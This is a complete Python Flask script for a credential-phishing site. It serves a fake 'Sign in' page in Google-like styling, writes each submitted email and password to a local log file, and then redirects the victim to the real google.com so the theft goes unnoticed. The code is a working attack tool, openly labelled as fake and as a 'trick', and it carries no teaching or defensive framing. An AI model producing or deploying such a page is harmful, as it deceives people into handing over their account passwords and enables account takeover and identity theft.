from flask import Flask, request, render_template_string

app = Flask(__name__)

# The 'Fake' Login Page Design
html_content = """
<!DOCTYPE html>
<html>
<head>
    <title>Account Verification</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 15px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        input { width: 90%; padding: 12px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        button { width: 97%; padding: 12px; background-color: #4285f4; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
        button:hover { background-color: #357ae8; }
    </style>
</head>
<body>
    <div class="box">
        <h2 style="color: #5f6368;">Sign in</h2>
        <p>Use your Account to continue</p>
        <input type="text" id="email" placeholder="Email or phone">
        <input type="password" id="pass" placeholder="Enter your password">
        <button onclick="sendData()">Next</button>
    </div>

    <script>
        function sendData() {
            var e = document.getElementById('email').value;
            var p = document.getElementById('pass').value;
            // Sends data to our capture link
            window.location.href = "/capture?email=" + e + "&pass=" + p;
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_content)

@app.route('/capture')
def capture():
    email = request.args.get('email')
    password = request.args.get('pass')
    
    # Save the data to a file
    with open("captured_data.log", "a") as f:
        f.write(f"EMAIL: {email} | PASSWORD: {password}\\n")
    
    # REDIRECT: This is the trick. It sends them to the real site!
    return "<h3>Loading...</h3><script>window.location.href = 'https://www.google.com';</script>"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

